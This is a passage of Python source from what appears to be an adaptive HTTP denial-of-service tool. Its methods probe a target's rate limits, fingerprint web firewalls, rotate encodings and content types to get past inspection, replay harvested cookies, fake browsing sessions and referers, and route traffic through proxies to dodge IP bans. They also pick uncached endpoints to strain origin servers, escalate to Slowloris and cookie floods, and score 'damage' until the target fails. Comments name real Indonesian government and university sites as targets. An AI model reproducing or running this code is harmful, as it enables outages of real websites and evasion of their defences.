        if intel["total_executions"] % 100 != 0 or intel["total_executions"] < 100:
            return
            
        intel["generation"] += 1
        
        # Score current DNA based on combined metrics
        eff_scores = intel.get("efficiency_score", {})
        if not eff_scores:
            return
            
        avg_efficiency = sum(eff_scores.values()) / max(len(eff_scores), 1)
        burn_penalty = len(BURNED_PROXIES) * 2
        damage_bonus = intel.get("damage_score", 0) / 10
        streak_bonus = intel.get("successful_streak", 0)
        
        fitness = int((avg_efficiency * 100) + damage_bonus + streak_bonus - burn_penalty)
        
        # Store current weights as DNA
        current_plan = self._chaos_plan()
        dna_entry = {"weights": dict(current_plan), "fitness": fitness, "gen": intel["generation"]}
        
        # Add to gene pool
        intel["gene_pool"].append(dna_entry)
        
        # Keep only top 5 performing DNA
        intel["gene_pool"] = sorted(intel["gene_pool"], key=lambda x: -x["fitness"])[:5]
        
        if len(intel["gene_pool"]) >= 2:
            # Crossover: Breed top 2 DNAs
            parent_a = intel["gene_pool"][0]["weights"]
            parent_b = intel["gene_pool"][1]["weights"]
            
            child = {}
            for method in set(list(parent_a.keys()) + list(parent_b.keys())):
                # 50% chance from each parent
                if randint(0, 1) == 0:
                    child[method] = parent_a.get(method, 0)
                else:
                    child[method] = parent_b.get(method, 0)
                    
                # 15% mutation chance
                if randint(1, 100) <= 15:
                    mutation = randint(-20, 30)
                    child[method] = max(child[method] + mutation, 0)
            
            intel["current_dna"] = child
            
            if int(REQUESTS_SENT) > 0 and intel["generation"] % 3 == 0:
                print(f"{bcolors.OKCYAN}[CHAOS DNA] Generation {intel['generation']} | Best Fitness: {intel['gene_pool'][0]['fitness']} | Pool Size: {len(intel['gene_pool'])}{bcolors.RESET}")
    
    def _chaos_probe_rate_limit(self):
        """Carefully probe the exact rate limit threshold of the target.
        Sends controlled bursts to find the maximum safe RPS."""
        intel = self._chaos_intel
        
        if intel.get("rate_limit_probed"):
            return
        
        # Only probe once, early in the attack
        if intel["total_executions"] != 50:
            return
            
        intel["rate_limit_probed"] = True
        
        try:
            import urllib.request
            target_url = f"{self._target.scheme}://{self._target.authority}/"
            
            # Send increasing burst sizes and check when we get blocked
            threshold = 0
            for burst_size in [5, 10, 15, 20, 30]:
                blocked = False
                for i in range(burst_size):
                    try:
                        req = urllib.request.Request(target_url, headers={
                            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/136.0.0.0 Safari/537.36'
                        })
                        with urllib.request.urlopen(req, timeout=4) as resp:
                            if resp.status in (403, 429):
                                blocked = True
                                break
                    except Exception:
                        blocked = True
                        break
                        
                if blocked:
                    threshold = burst_size - 1
                    break
                else:
                    threshold = burst_size
                    
            intel["rate_limit_threshold"] = max(threshold, 3)
            
            if int(REQUESTS_SENT) < 100:
                if threshold < 10:
                    limit_str = f"{bcolors.FAIL}STRICT ({threshold} req/burst){bcolors.RESET}"
                elif threshold < 20:
                    limit_str = f"{bcolors.WARNING}MODERATE ({threshold} req/burst){bcolors.RESET}"
                else:
                    limit_str = f"{bcolors.OKGREEN}LENIENT ({threshold}+ req/burst){bcolors.RESET}"
                print(f"[CHAOS PROBE] Rate limit threshold: {limit_str}")
                
        except Exception:
            intel["rate_limit_threshold"] = 5  # Assume strict
    
    def _chaos_multi_path_targeting(self):
        """Generate a queue of (path, method_hint) pairs for simultaneous multi-path attacks.
        Instead of hitting one endpoint, distribute across multiple for maximum backend stress."""
        intel = self._chaos_intel
        
        if intel.get("multi_path_queue"):
            return  # Queue still active
            
        # Gather all known paths
        all_paths = []
        uncached = intel.get("uncached_paths", [])
        discovered = intel.get("endpoints_discovered", [])
        
        if hasattr(self, 'crawled_paths') and self.crawled_paths:
            all_paths.extend(self.crawled_paths[:10])
        all_paths.extend(uncached)
        all_paths.extend(discovered)
        
        if not all_paths:
            return
            
        # Remove duplicates
        all_paths = list(set(all_paths))
        
        # Build multi-path queue with method hints
        queue = []
        for path in all_paths[:8]:  # Max 8 paths per cycle
            path_lower = path.lower()
            
            # Match paths with optimal methods
            if 'xmlrpc' in path_lower:
                queue.append((path, "XMLRPC_AMP"))
            elif 'search' in path_lower or '?s=' in path_lower or '?q=' in path_lower:
                queue.append((path, "WP_SEARCH"))
            elif 'api' in path_lower or 'graphql' in path_lower or 'rest' in path_lower:
                queue.append((path, "POST_DYN"))
            elif 'login' in path_lower or 'admin' in path_lower:
                queue.append((path, "POST_DYN"))
            elif 'cart' in path_lower or 'checkout' in path_lower:
                queue.append((path, "POST_DYN"))
            else:
                queue.append((path, "DYN"))
        
        # Shuffle to avoid predictable ordering
        from random import shuffle
        shuffle(queue)
        intel["multi_path_queue"] = queue
    
    def _chaos_encode_payload(self, payload_str):
        """Rotate payload encoding to evade Deep Packet Inspection (DPI).
        WAFs often only inspect one encoding format."""
        intel = self._chaos_intel
        intel["encoding_rotation"] += 1
        variant = intel["encoding_rotation"] % 6
        
        if variant == 0:
            return payload_str  # Raw
        elif variant == 1:
            # URL-encode special characters
            from urllib.parse import quote
            return quote(payload_str, safe='{}":,')
        elif variant == 2:
            # Double-encode (bypasses single-decode WAF rules)
            from urllib.parse import quote
            return quote(quote(payload_str, safe=''), safe='')
        elif variant == 3:
            # Add null bytes (some WAFs truncate at null)
            return payload_str.replace('"', '%00"')
        elif variant == 4:
            # Unicode escape sequences
            return payload_str.replace('a', '\u0061').replace('e', '\u0065')
        else:
            # Chunked-style padding
            return '  ' + payload_str + '  '
    
    def _chaos_score_path(self, path, success):
        """Track success rate per path for intelligent path selection."""
        intel = self._chaos_intel
        if path not in intel["path_scores"]:
            intel["path_scores"][path] = {"success": 0, "total": 0}
        intel["path_scores"][path]["total"] += 1
        if success:
            intel["path_scores"][path]["success"] += 1

    def _chaos_analyze_block_page(self, response_body):
        """Analyze WAF block pages to identify exact rules being triggered.
        This lets us understand WHY we're being blocked and adapt specifically."""
        intel = self._chaos_intel
        body = response_body.lower() if response_body else ""
        
        # WAF-specific block page signatures
        signatures = {
            # Cloudflare
            "attention required": ("cloudflare", "js_challenge"),
            "ray id": ("cloudflare", "ray_block"),
            "enable javascript and cookies": ("cloudflare", "browser_check"),
            "error 1020": ("cloudflare", "firewall_rule"),
            "error 1015": ("cloudflare", "rate_limited"),
            "error 1012": ("cloudflare", "origin_unreachable"),
            # Akamai
            "access denied": ("akamai", "access_denied"),
            "reference #": ("akamai", "ref_block"),
            # Imperva/Incapsula
            "incapsula incident": ("imperva", "incident"),
            "powered by incapsula": ("imperva", "bot_block"),
            "_incapsula_resource": ("imperva", "resource_check"),
            # Sucuri
            "sucuri website firewall": ("sucuri", "waf_block"),
            "access denied - sucuri": ("sucuri", "access_denied"),
            # Wordfence
            "blocked by wordfence": ("wordfence", "rule_block"),
            "wordfence - firewall": ("wordfence", "firewall"),
            "your access to this site": ("wordfence", "ip_block"),
            # ModSecurity
            "mod_security": ("modsec", "rule_match"),
            "not acceptable": ("modsec", "406_block"),
            "request rejected": ("modsec", "rejected"),
            # AWS WAF
            "request blocked": ("aws_waf", "blocked"),
            # DDoS-Guard
            "ddos-guard": ("ddosguard", "challenge"),
            # Generic
            "403 forbidden": ("generic", "forbidden"),
            "429 too many": ("generic", "rate_limit"),
            "captcha": ("generic", "captcha_required"),
        }
        
        detected = []
        for sig, (waf_name, rule_type) in signatures.items():
            if sig in body:
                detected.append({"waf": waf_name, "rule": rule_type, "signal": sig})
                
        if detected:
            intel["waf_block_signatures"] = detected
            # Extract specific rules triggered
            rules = [d["rule"] for d in detected]
            intel["waf_rules_triggered"] = rules
            
            # WAF Anomaly & Browser Engine interaction
            if "js_challenge" in rules:
                intel["anomaly_score"] = min(intel.get("anomaly_score", 0) + 10, 100)
                if not intel.get("playwright_active"):
                    intel["playwright_active"] = True
                    if int(REQUESTS_SENT) > 0 and int(REQUESTS_SENT) < 2000:
                        print(f"{bcolors.WARNING}[CHAOS WAF] JS Challenge detected! Activating Headless Browser Engine to bypass...{bcolors.RESET}")
            
            # Auto-correct WAF type if recon missed it
            primary_waf = detected[0]["waf"]
            if intel.get("waf_type") == "none" and primary_waf != "generic":
                intel["waf_type"] = primary_waf
                if int(REQUESTS_SENT) < 50:
                    print(f"{bcolors.WARNING}[CHAOS] WAF re-identified from block page: {primary_waf.upper()}{bcolors.RESET}")
                    
        return detected
    
    def _chaos_harvest_cookies(self, response_headers):
        """Collect Set-Cookie headers from target responses for session persistence.
        Replaying legitimate cookies makes our requests look like returning visitors."""
        intel = self._chaos_intel
        if not response_headers:
            return
            
        cookies_raw = response_headers if isinstance(response_headers, str) else str(response_headers)
        
        import re
        cookie_matches = re.findall(r'Set-Cookie:\s*([^;]+)', cookies_raw, re.IGNORECASE)
        for cookie in cookie_matches:
            if '=' in cookie:
                key, val = cookie.split('=', 1)
                key = key.strip()
                val = val.strip()
                # Skip tracking/analytics cookies, keep session cookies
                skip_prefixes = ['_ga', '_gid', '_fbp', 'utm_']
                if not any(key.lower().startswith(p) for p in skip_prefixes):
                    intel["harvested_cookies"][key] = val
    
    def _chaos_get_cookie_header(self):
        """Build a cookie header string from harvested + cf_clearance cookies."""
        intel = self._chaos_intel
        cookies = dict(intel.get("harvested_cookies", {}))
        
        # Add cf_clearance if available
        if hasattr(self, '_cf_clearance') and self._cf_clearance:
            cookies["cf_clearance"] = self._cf_clearance
            
        if not cookies:
            return None
            
        return "; ".join(f"{k}={v}" for k, v in cookies.items())
    
    def _chaos_adaptive_rate(self):
        """Dynamically adjust attack rate based on success/block ratio.
        Smart pacing: slow down when detected, speed up when invisible."""
        intel = self._chaos_intel
        
        # Calculate recent success rate
        all_history = intel.get("success_history", {})
        recent_results = []
        for method, results in all_history.items():
            recent_results.extend(results[-10:])
            
        if len(recent_results) < 5:
            return  # Not enough data
            
        success_rate = sum(recent_results) / len(recent_results)
        
        # Adjust RPC (requests per connection)
        if success_rate > 0.85:
            # We're invisible. Increase pressure
            intel["adaptive_rpc"] = min(intel["adaptive_rpc"] + 2, 30)
            intel["jitter_ms"] = 0  # No need to slow down
            intel["successful_streak"] += 1
        elif success_rate > 0.6:
            # Moderate resistance. Stay steady
            intel["adaptive_rpc"] = max(min(intel["adaptive_rpc"], 15), 8)
            intel["jitter_ms"] = randint(10, 50)
        elif success_rate > 0.3:
            # Heavy resistance. Slow down significantly
            intel["adaptive_rpc"] = max(intel["adaptive_rpc"] - 2, 5)
            intel["jitter_ms"] = randint(50, 200)
            intel["successful_streak"] = 0
        else:
            # Almost fully blocked. Minimal rate
            intel["adaptive_rpc"] = max(intel["adaptive_rpc"] - 3, 3)
            intel["jitter_ms"] = randint(200, 500)
            intel["successful_streak"] = 0
            
        # Boost temperature based on streaks
        if intel["successful_streak"] > 20:
            intel["temperature"] = min(intel["temperature"] + 0.05, 1.0)
    
    def _chaos_calculate_damage(self):
        """Estimate total damage dealt to target based on observable signals."""
        intel = self._chaos_intel
        
        score = 0
        # Requests that got through = pressure on server
        total_success = sum(sum(v) for v in intel.get("success_history", {}).values())
        score += total_success * 1
        
        # Response time increase = server struggling
        rt_baseline = intel.get("response_time_ms", 500) or 500
        hp = intel.get("health_history", [])
        if hp:
            latest_rt = hp[-1]
            if latest_rt > rt_baseline * 2:
                score += (latest_rt - rt_baseline) // 10
                
        # 5xx errors = server crashing  
        score += intel.get("consecutive_5xx", 0) * 50
        
        # Target down = maximum damage
        if intel.get("target_is_down"):
            score += 1000
            
        intel["damage_score"] = score
        return score
    
    def _chaos_simulate_session(self):
        """Simulate a realistic multi-step user session to build cookie trust.
        WAF behavioral analysis tracks user journeys. A request without prior
        navigation history is flagged as bot traffic. This builds that history."""
        intel = self._chaos_intel
        
        # Build a realistic navigation journey
        target_base = f"{self._target.scheme}://{self._target.authority}"
        journey_steps = [
            "/",                        # Step 1: User lands on homepage
            "/about", "/contact",       # Step 2: Browses informational pages
        ]
        
        # Add discovered paths for realism
        discovered = intel.get("endpoints_discovered", [])
        if discovered:
            journey_steps.extend(discovered[:3])
        
        # Add crawled paths
        if hasattr(self, 'crawled_paths') and self.crawled_paths:
            journey_steps.extend(self.crawled_paths[:5])
            
        # Execute a mini journey (3-4 steps) to build referer chain
        referer_chain = []
        try:
            import urllib.request
            for i, step in enumerate(journey_steps[:4]):
                url = f"{target_base}{step}" if step.startswith("/") else step
                headers = self._chaos_get_browser_profile()
                if referer_chain:
                    headers["Referer"] = referer_chain[-1]
                    
                req = urllib.request.Request(url, headers=headers)
                try:
                    with urllib.request.urlopen(req, timeout=4) as resp:
                        # Check cache status from response
                        cache_status = resp.headers.get('X-Cache', '').lower()
                        cf_cache = resp.headers.get('CF-Cache-Status', '').lower()
                        
                        if 'hit' in cache_status or 'hit' in cf_cache:
                            if step not in intel["cached_paths"]:
                                intel["cached_paths"].append(step)
                        else:
                            if step not in intel["uncached_paths"]:
                                intel["uncached_paths"].append(step)
                                
                        referer_chain.append(url)
                except Exception:
                    pass
                    
        except Exception:
            pass
            
        intel["referer_chain"] = referer_chain
        intel["session_journey"] = journey_steps[:4]
        
        if int(REQUESTS_SENT) < 10 and intel["uncached_paths"]:
            print(f"{bcolors.OKGREEN}[CHAOS SESSION] Cache-bypassing paths found: {intel['uncached_paths'][:5]}{bcolors.RESET}")
    
    def _chaos_get_smart_referer(self):
        """Generate a realistic Referer header from the session journey."""
        intel = self._chaos_intel
        chain = intel.get("referer_chain", [])
        
        if chain:
            return randchoice(chain)
        
        # Fallback: generate plausible referers
        target_base = f"{self._target.scheme}://{self._target.authority}"
        fake_referers = [
            target_base + "/",
            f"https://www.google.com/search?q={self._target.authority}",
            f"https://www.google.com/",
            target_base + "/about",
            f"https://www.bing.com/search?q={self._target.authority}",
        ]
        return randchoice(fake_referers)
    
    def _chaos_get_smart_content_type(self):
        """Rotate POST content types to evade content-type-specific WAF rules."""
        intel = self._chaos_intel
        intel["content_type_rotation"] += 1
        rotation = intel["content_type_rotation"] % 5
        
        content_types = [
            "application/json",
            "application/x-www-form-urlencoded",
            "multipart/form-data; boundary=----WebKitFormBoundary" + ProxyTools.Random.rand_str(16),
            "text/plain",
            "application/json; charset=utf-8",
        ]
        return content_types[rotation]
    
    def _chaos_get_cache_busting_path(self):
        """Select path that bypasses CDN cache for maximum origin server impact."""
        intel = self._chaos_intel
        uncached = intel.get("uncached_paths", [])
        
        if uncached:
            # Prefer uncached paths - these hit the origin server directly
            return randchoice(uncached)
        
        # Fallback: generate cache-busting query strings
        base_path = self.get_random_target_path()
        sep = "&" if "?" in base_path else "?"
        # These parameters force CDN cache miss
        busters = [
            f"{sep}_={int(time())}",
            f"{sep}nocache={ProxyTools.Random.rand_str(8)}",
            f"{sep}cb={randint(100000, 999999)}",
            f"{sep}v={ProxyTools.Random.rand_str(6)}&t={int(time())}",
        ]
        return base_path + randchoice(busters)

    def _chaos_retry_escalate(self, failed_method_name, method_map):
        """If method A fails, try a stronger/different variant automatically."""
        # Escalation chains: method -> fallback method
        escalation = {
            "GET": "DYN",           # Static GET failed -> Dynamic path GET
            "POST": "POST_DYN",     # Static POST -> Dynamic payload POST
            "STRESS": "SLOW_V2",    # Noisy stress blocked -> Go low and slow
            "PPS": "DYN",           # Raw packets blocked -> Dynamic headers
            "DYN": "STEALTH_JA3",   # Dynamic blocked -> Full TLS mimicry
            "POST_DYN": "STEALTH_JA3",
            "BOT": "STEALTH_JA3",
            "COOKIE": "STEALTH_JA3",
            "STEALTH_JA3": "SLOW_V2",  # Even stealth blocked -> Slowloris
            "SLOW_V2": "COOKIE",       # Slowloris blocked -> Cookie flood
        }
        fallback = escalation.get(failed_method_name)
        if fallback and fallback in method_map:
            try:
                method_map[fallback]()
                return True
            except Exception:
                pass
        return False

    def _chaos_health_pulse(self):
        """[V43] Periodic health check using EXTERNAL IP via Proxy Legion.
        Completely bypasses local IP bans and external API rate limits."""
        intel = self._chaos_intel
        now = time()
        
        if now - intel.get("last_health_check", 0) < 30:
            return
        intel["last_health_check"] = now
        
        try:
            t_start = time()
            resp_data = b""
            sock = None
            success_proxy = False
            
            for _ in range(8):
                sock = self.open_connection()
                if sock:
                    try:
                        req = f"HEAD / HTTP/1.1\r\nHost: {self._target.authority}\r\nUser-Agent: Mozilla/5.0\r\nConnection: close\r\n\r\n"
                        sock.sendall(req.encode())
                        resp_data = sock.recv(512)
                        if resp_data:
                            success_proxy = True
                            break
                    except: pass
                    finally:
                        Tools.safe_close(sock)
            
            latency = int((time() - t_start) * 1000)
            
            if success_proxy and b'HTTP/' in resp_data:
                try:
                    status = int(resp_data.split(b' ')[1])
                except:
                    status = 0
                
                est_latency = max((latency / 3), 50)
                intel["health_history"].append(est_latency)
                if len(intel["health_history"]) > 20:
                    intel["health_history"] = intel["health_history"][-20:]
                
                if len(intel["health_history"]) >= 3:
                    recent_avg = sum(intel["health_history"][-3:]) / 3
                    baseline = intel.get("response_time_ms", 500) or 500
                    
                    if recent_avg > baseline * 3:
                        intel["target_getting_weaker"] = True
                        intel["target_is_down"] = False
                    elif recent_avg > baseline * 1.5:
                        intel["target_getting_weaker"] = True
                        intel["target_is_down"] = False
                    else:
                        intel["target_getting_weaker"] = False
                        intel["target_is_down"] = False
                        
                if status >= 500:
                    intel["consecutive_5xx"] = intel.get("consecutive_5xx", 0) + 1
                    
            else:
                # 8 external proxies timed out = target truly down
                intel["health_history"].append(9999)
                if len(intel["health_history"]) >= 3:
                    last_3 = intel["health_history"][-3:]
                    if all(t >= 9999 for t in last_3):
                        intel["target_is_down"] = True
                        intel["target_getting_weaker"] = True
                    
        except Exception:
            pass
    def _chaos_detect_waf_adaptation(self):
        """Detect if the WAF is learning our attack patterns and adapting."""
        intel = self._chaos_intel
        now = time()
        
        # Track blocks per 60-second window
        if now - intel.get("last_block_window_time", 0) >= 60:
            current_blocks = intel["consecutive_block"]
            intel["blocks_per_minute"].append(current_blocks)
            if len(intel["blocks_per_minute"]) > 10:
                intel["blocks_per_minute"] = intel["blocks_per_minute"][-10:]
            intel["last_block_window_time"] = now
            intel["consecutive_block"] = 0
            
            # If block rate is INCREASING over time, WAF is adapting
            bpm = intel["blocks_per_minute"]
            if len(bpm) >= 3:
                trend_old = sum(bpm[:len(bpm)//2]) / max(len(bpm)//2, 1)
                trend_new = sum(bpm[len(bpm)//2:]) / max(len(bpm) - len(bpm)//2, 1)
                
                if trend_new > trend_old * 1.5 and trend_new > 2:
                    intel["waf_adapting"] = True
                else:
                    intel["waf_adapting"] = False
    
    def _chaos_decoy(self):
        """Inject legitimate-looking traffic to camouflage attack patterns.
        Uses full browser profile + referer chain for maximum authenticity."""
        try:
            s = self.open_connection()
            profile = self._chaos_get_browser_profile()
            decoy_paths = ["/", "/robots.txt", "/favicon.ico", "/sitemap.xml", "/about", "/contact"]
            path = randchoice(decoy_paths)
            referer = self._chaos_get_smart_referer()
            
            payload = (f"GET {path} HTTP/1.1\r\n"
                       f"Host: {self._target.authority}\r\n"
                       f"User-Agent: {profile.get('User-Agent', randchoice(self._useragents))}\r\n"
                       f"Accept: {profile.get('Accept', 'text/html,*/*')}\r\n"
                       f"Accept-Language: {profile.get('Accept-Language', 'en-US,en;q=0.9')}\r\n"
                       f"Accept-Encoding: {profile.get('Accept-Encoding', 'gzip, deflate, br')}\r\n"
                       f"Referer: {referer}\r\n"
                       f"Connection: keep-alive\r\n"
                       f"\r\n").encode("utf-8")
            Tools.send(s, payload)
            Tools.safe_close(s)
        except Exception:
            pass

    def _chaos_recon(self):
        """Phase 1: Deep Multi-Probe Reconnaissance."""
        intel = self._chaos_intel
        if intel["recon_done"]:
            return
            
        intel["recon_done"] = True
        target_url = f"{self._target.scheme}://{self._target.authority}/"
        
        # --- PROBE 1: Main page fingerprint (via Distributed Proxies to bypass IP bans) ---
        try:
            import urllib.request
            t_start = time()
            
            # [V43] Distributed RECON via native Sockets to avoid Hackertarget Rate limits (50/day)
            sock = None
            raw_data = b""
            success_proxy = False
            for _ in range(10): # Try up to 10 proxies for RECON to guarantee connection
                sock = self.open_connection()
                if sock:
                    try:
                        req_str = f"GET / HTTP/1.1\r\nHost: {self._target.authority}\r\nUser-Agent: Mozilla/5.0\r\nConnection: close\r\n\r\n"
                        sock.sendall(req_str.encode())
                        raw_data = sock.recv(16384)
                        if raw_data:
                            success_proxy = True
                            break
                    except: pass
                    finally:
                        Tools.safe_close(sock)
            
            intel["response_time_ms"] = max(int((time() - t_start) * 1000) - 200, 50)
            
            if success_proxy and b'HTTP/' in raw_data:
                full_text = raw_data.decode('utf-8', errors='ignore')
                # Split headers and body
                parts = full_text.split('\r\n\r\n', 1)
                headers_raw = parts[0].lower()
                body = parts[1].lower() if len(parts) > 1 else ''
                
                server_hdr = ''
                powered_by = ''
                for hdr_line in parts[0].split('\r\n'):
                    if hdr_line.lower().startswith('server:'):
                        server_hdr = hdr_line.split(':', 1)[1].strip().lower()
                    elif hdr_line.lower().startswith('x-powered-by:'):
                        powered_by = hdr_line.split(':', 1)[1].strip().lower()
            else:
                raise Exception("All proxies failed or Target is truly DOWN.")
                
                # --- Detect Server Type ---
                if 'nginx' in server_hdr: intel["server_type"] = "nginx"
                elif 'apache' in server_hdr: intel["server_type"] = "apache"
                elif 'litespeed' in server_hdr: intel["server_type"] = "litespeed"
                elif 'microsoft' in server_hdr or 'iis' in server_hdr: intel["server_type"] = "iis"
                elif 'cloudflare' in server_hdr: intel["server_type"] = "cloudflare"
                elif 'openresty' in server_hdr: intel["server_type"] = "openresty"
                else: intel["server_type"] = "unknown"
                
                # --- Detect WAF Type (expanded) ---
                all_signals = headers_raw + body
                if 'cloudflare' in headers_raw or 'cf-ray' in headers_raw or 'cf-cache-status' in headers_raw:
                    intel["waf_type"] = "cloudflare"
                elif 'akamai' in headers_raw or 'akamaighost' in server_hdr or 'x-akamai' in headers_raw:
                    intel["waf_type"] = "akamai"
                elif 'sucuri' in all_signals or 'x-sucuri' in headers_raw or 'sucuri-cache' in headers_raw:
                    intel["waf_type"] = "sucuri"
                elif 'imperva' in all_signals or 'incapsula' in all_signals or 'visid_incap' in all_signals:
                    intel["waf_type"] = "imperva"
                elif 'ddos-guard' in all_signals or 'ddosguard' in server_hdr:
                    intel["waf_type"] = "ddosguard"
                elif 'fastly' in headers_raw or 'x-fastly' in headers_raw:
                    intel["waf_type"] = "fastly"
                elif 'stackpath' in all_signals or 'securitypolicyviolation' in all_signals:
                    intel["waf_type"] = "stackpath"
                elif 'wordfence' in all_signals or 'wfwaf' in all_signals:
                    intel["waf_type"] = "wordfence"
                elif 'mod_security' in all_signals or 'modsecurity' in all_signals:
                    intel["waf_type"] = "modsec"
                elif 'aws' in headers_raw or 'awselb' in headers_raw or 'x-amz' in headers_raw:
                    intel["waf_type"] = "aws_waf"
                else:
                    intel["waf_type"] = "none"
                    
                # --- Detect CMS Type (expanded + header-based) ---
                # FIX: Also check Link header for wp-json (uns.ac.id: stub page but Link header present)
                link_header = headers_raw if isinstance(headers_raw, str) else ''
                if 'wp-content' in body or 'wordpress' in body or 'wp-json' in body or 'wp-includes' in body or 'wp-json' in link_header:
                    intel["cms_type"] = "wordpress"
                elif 'joomla' in body or '/media/system/js' in body:
                    intel["cms_type"] = "joomla"
                elif 'drupal' in body or 'sites/default' in body or 'drupal.js' in body:
                    intel["cms_type"] = "drupal"
                elif 'shopify' in body or 'cdn.shopify' in body:
                    intel["cms_type"] = "shopify"
                elif 'laravel' in powered_by or 'x-csrf-token' in body or 'xsrf-token' in headers_raw:
                    intel["cms_type"] = "laravel"
                    intel["backend_framework"] = "laravel"
                    # [V33] Livewire detection (surakarta.go.id uses this - heavy AJAX framework)
                    if 'livewire' in body:
                        intel["infra_map"]["livewire"] = True
                        if int(REQUESTS_SENT) < 100:
                            print(f"{bcolors.OKCYAN}[CHAOS RECON] Laravel Livewire detected! POST to /livewire/message will exhaust server.{bcolors.RESET}")
                elif 'nuxt' in powered_by:
                    intel["cms_type"] = "nuxtjs"
                    intel["backend_framework"] = "nuxtjs"
                elif 'next' in powered_by or '__next' in body:
                    intel["cms_type"] = "nextjs"
                else:
                    intel["cms_type"] = "custom"
                    
                # --- Detect Captcha ---
                captcha_signals = ['captcha', 'recaptcha', 'turnstile', 'hcaptcha', 'challenge-platform', 'g-recaptcha']
                if any(sig in all_signals for sig in captcha_signals):
                    intel["has_captcha"] = True
                    
                # --- Detect Rate Limiting (V32: Extract exact threshold) ---
                if 'x-ratelimit' in headers_raw or 'retry-after' in headers_raw or 'x-rate-limit' in headers_raw:
                    intel["has_rate_limit"] = True
                    intel["rate_limit_probed"] = True
                    # Try to extract the exact numeric limit from response headers
                    try:
                        raw_hdrs = str(resp.headers) if hasattr(resp, 'headers') else headers_raw
                        import re
                        rl_match = re.search(r'X-RateLimit-Limit:\s*(\d+)', raw_hdrs, re.IGNORECASE)
                        if rl_match:
                            intel["rate_limit_threshold"] = int(rl_match.group(1))
                            print(f"{bcolors.WARNING}[CHAOS RECON] Rate-Limit threshold extracted: {intel['rate_limit_threshold']} req/window{bcolors.RESET}")
                    except: pass
                    
        except Exception:
            intel["waf_type"] = "unknown_heavy"
            intel["server_type"] = "unknown"
            intel["cms_type"] = "custom"
            intel["has_captcha"] = True
            intel["response_time_ms"] = 9999
            
        # --- PROBE 2: Discover heavy endpoints silently ---
        heavy_probes = ['/wp-login.php', '/xmlrpc.php', '/wp-admin/admin-ajax.php',
                        '/?s=test', '/search?q=test', '/api/', '/graphql', '/rest/']
        discovered = []
        for probe_path in heavy_probes:
            try:
                probe_url = f"{self._target.scheme}://{self._target.authority}{probe_path}"
                req2 = urllib.request.Request(probe_url, headers={
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/136.0.0.0 Safari/537.36'
                })
                with urllib.request.urlopen(req2, timeout=4) as resp2:
                    if resp2.status < 404:
                        discovered.append(probe_path)
            except Exception:
                pass
        intel["endpoints_discovered"] = discovered
        
        # Upgrade CMS detection from endpoint probes
        if '/xmlrpc.php' in discovered or '/wp-login.php' in discovered:
            intel["cms_type"] = "wordpress"
            
        # Log full intelligence report
        if int(REQUESTS_SENT) < 10:
            latency_color = bcolors.OKGREEN if intel["response_time_ms"] < 500 else bcolors.WARNING if intel["response_time_ms"] < 2000 else bcolors.FAIL
            print(f"")
            print(f"{bcolors.OKCYAN}[CHAOS V12 RECON REPORT]{bcolors.RESET}")
            print(f"  WAF Detected  : {bcolors.WARNING}{intel['waf_type'].upper()}{bcolors.RESET}")
            print(f"  Server Engine : {intel['server_type']}")
            print(f"  CMS Platform  : {bcolors.OKBLUE}{intel['cms_type'].upper()}{bcolors.RESET}")
            print(f"  Response Time : {latency_color}{intel['response_time_ms']}ms{bcolors.RESET}")
            print(f"  Captcha Active: {'YES' if intel['has_captcha'] else 'NO'}")
            print(f"  Rate Limiting : {'YES' if intel['has_rate_limit'] else 'NO'}")
            print(f"  Heavy Endpoints: {discovered if discovered else 'None found'}")
            print(f"")
    
    def _chaos_plan(self):
        """Phase 2: Strategic Planning with phase transitions and deep adaptation."""
        intel = self._chaos_intel
        intel["total_executions"] += 1
        tick = intel["total_executions"]
        
        # === PHASE TRANSITIONS (Military Doctrine) ===
        # PROBE(0-20) -> CALIBRATE(20-80) -> ASSAULT(80-300) -> SUSTAIN(300+)
        if tick <= 20:
            intel["phase"] = "PROBE"      # Test all methods equally
        elif tick <= 80:
            intel["phase"] = "CALIBRATE"  # Start favoring what works
        elif tick <= 300:
            intel["phase"] = "ASSAULT"    # Full power on best methods
        else:
            intel["phase"] = "SUSTAIN"    # Maintain pressure, conserve resources
            
        # Check if target is dying (consecutive 5xx = server overload)
        if intel["consecutive_5xx"] >= 5:
            intel["phase"] = "FINISH"     # Target is crumbling, finish it
            
        phase = intel["phase"]
        
        # === BASE WEIGHTS ===
        weights = {
            "GET": 10, "POST": 10, "STRESS": 5, "PPS": 5,
            "DYN": 10, "POST_DYN": 15, "SLOW_V2": 0,
            "STEALTH_JA3": 0, "XMLRPC_AMP": 0, "WP_SEARCH": 0,
            "BOT": 0, "COOKIE": 0,
        }
        
        # === STRATEGY A: WAF-Specific Counter-Tactics ===
        waf = intel.get("waf_type", "none")
        
        waf_profiles = {
            "cloudflare":    {"STEALTH_JA3": 70, "SLOW_V2": 30, "POST_DYN": 25, "BOT": 15, "STRESS": 0, "PPS": 0},
            "akamai":        {"STEALTH_JA3": 80, "SLOW_V2": 25, "POST_DYN": 20, "GET": 5, "STRESS": 0, "PPS": 0},
            "imperva":       {"STEALTH_JA3": 60, "COOKIE": 30, "POST_DYN": 25, "SLOW_V2": 20, "DYN": 20},
            "sucuri":        {"STEALTH_JA3": 50, "POST_DYN": 30, "DYN": 25, "BOT": 20},
            "modsec":        {"POST_DYN": 35, "DYN": 30, "COOKIE": 20, "STEALTH_JA3": 40, "STRESS": 0},
            "wordfence":     {"POST_DYN": 40, "DYN": 30, "WP_SEARCH": 50, "XMLRPC_AMP": 45, "STEALTH_JA3": 30},
            "ddosguard":     {"STEALTH_JA3": 75, "SLOW_V2": 35, "POST_DYN": 20, "STRESS": 0, "PPS": 0},
            "fastly":        {"STEALTH_JA3": 65, "POST_DYN": 30, "DYN": 25, "SLOW_V2": 20},
            "stackpath":     {"STEALTH_JA3": 60, "SLOW_V2": 30, "POST_DYN": 25, "DYN": 20},
            "aws_waf":       {"STEALTH_JA3": 70, "POST_DYN": 30, "DYN": 25, "COOKIE": 15, "STRESS": 0},
            "unknown_heavy": {"STEALTH_JA3": 80, "SLOW_V2": 40, "POST_DYN": 15, "GET": 5, "STRESS": 0, "PPS": 0},
        }
        
        if waf in waf_profiles:
            for k, v in waf_profiles[waf].items():
                weights[k] = v
        else:
            # No WAF, full aggression
            weights.update({"STRESS": 30, "PPS": 25, "GET": 25, "POST": 25, "POST_DYN": 30})
            
        # === STRATEGY B: CMS-Specific Exploitation ===
